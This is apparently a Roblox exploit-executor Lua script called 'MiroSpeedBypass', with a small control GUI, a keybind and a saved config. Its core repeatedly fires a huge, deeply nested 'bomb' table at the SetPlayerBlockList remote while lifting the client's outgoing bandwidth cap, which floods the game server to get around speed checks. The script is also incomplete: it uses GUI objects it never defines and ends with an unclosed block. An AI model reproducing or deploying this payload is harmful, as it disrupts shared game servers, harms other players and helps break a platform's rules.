repeat task.wait() until game:IsLoaded()

local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local NetworkClient = game:GetService("NetworkClient")

-- Config
local saveFile = "MiroSpeedBypass.json"
local Config = {
    Power = 97000,
    Keybind = "V",
    Enabled = false
}

-- Load config
if isfile and isfile(saveFile) then
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(saveFile)) end)
    if ok and data then
        if type(data.Power) == "number" then Config.Power = math.clamp(data.Power, 10000, 500000) end
        if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
        if type(data.Enabled) == "boolean" then Config.Enabled = data.Enabled end
    end
end

local function Save()
    if writefile then
        pcall(function() writefile(saveFile, HttpService:JSONEncode(Config)) end)
    end
end

-- Cleanup old GUI
for _, v in ipairs(CoreGui:GetChildren()) do
    if v.Name == "MiroSpeedBypass" then v:Destroy() end
end

-- Bypass logic
local running = false
local preBuiltBomb = nil
local bypassThread = nil
local DEPTH = 296

local function buildBomb(power)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, DEPTH do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maxRep = math.floor(power / (DEPTH + 2))
    for i = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

local function StartBypass()
    if running then return end
    running = true
    Config.Enabled = true
    Save()

    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
    preBuiltBomb = buildBomb(Config.Power)

    bypassThread = task.spawn(function()
        while running do
            if preBuiltBomb then
                pcall(function()
                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(preBuiltBomb)
                end)
            end
            task.wait(0.17)
        end
    end)
end

local function StopBypass()
    running = false
    Config.Enabled = false
    Save()
    if bypassThread then task.cancel(bypassThread) end
    bypassThread = nil
    preBuiltBomb = nil
    pcall(function() NetworkClient:SetOutgoingKBPSLimit(0) end)
end

local function ToggleBypass()
    if running then StopBypass() else StartBypass() end
end

-- Update toggle visuals
local function updateToggleVisuals()
    ToggleBtn.Text = running and "STATUS: ENABLED" or "STATUS: DISABLED"
    ToggleBtn.TextColor3 = running and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(200, 200, 200)
    ToggleStroke.Color = running and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(70, 70, 70)
end

-- Toggle button
ToggleBtn.MouseButton1Click:Connect(function()
    ToggleBypass()
    updateToggleVisuals()
end)

-- Power textbox
PowerBox.FocusLost:Connect(function()
    local num = tonumber(PowerBox.Text)
    if num then
        Config.Power = math.clamp(num, 10000, 500000)
    else
        Config.Power = 97000
    end
    PowerBox.Text = tostring(Config.Power)
    Save()
    if running then
        StopBypass()
        task.wait(0.1)
        StartBypass()
    end
end)

-- Minus/Plus buttons
local function adjustPower(delta)
    Config.Power = math.clamp(Config.Power + delta, 10000, 500000)
    PowerBox.Text = tostring(Config.Power)
    Save()
    if running then
        StopBypass()
        task.wait(0.1)
        StartBypass()
    end
end

MinusBtn.MouseButton1Click:Connect(function()
    adjustPower(-1000)
end)

PlusBtn.MouseButton1Click:Connect(function()
    adjustPower(1000)
end)

-- Keybind changing
local listeningForKey = false
KeybindBtn.MouseButton1Click:Connect(function()
    if listeningForKey then return end
    listeningForKey = true
    KeybindBtn.Text = "..."
    KeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 100)

    local conn
    conn = UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.UserInputType == Enum.UserInputType.Keyboard then
            Config.Keybind = input.KeyCode.Name
            KeybindBtn.Text = Config.Keybind
            KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            listeningForKey = false
            Save()
            if conn then conn:Disconnect() end
        end
    end)

    task.delay(5, function()
        if listeningForKey then
            listeningForKey = false
            KeybindBtn.Text = Config.Keybind
            KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            if conn then conn:Disconnect() end
        end
    end)
end)

-- Keybind listener
UserInputService.InputBegan:Connect(function(input, processed)
    if processed or listeningForKey then return end
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == Config.Keybind then
        ToggleBypass()
        updateToggleVisuals()
    end
end)

-- Draggable
local dragging = false
local dragStart, startPos

Frame2.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- Auto-start if was enabled
if Config.Enabled then
    task.delay(1, function()
        ToggleBypass()
        updateToggleVisuals()
    end)
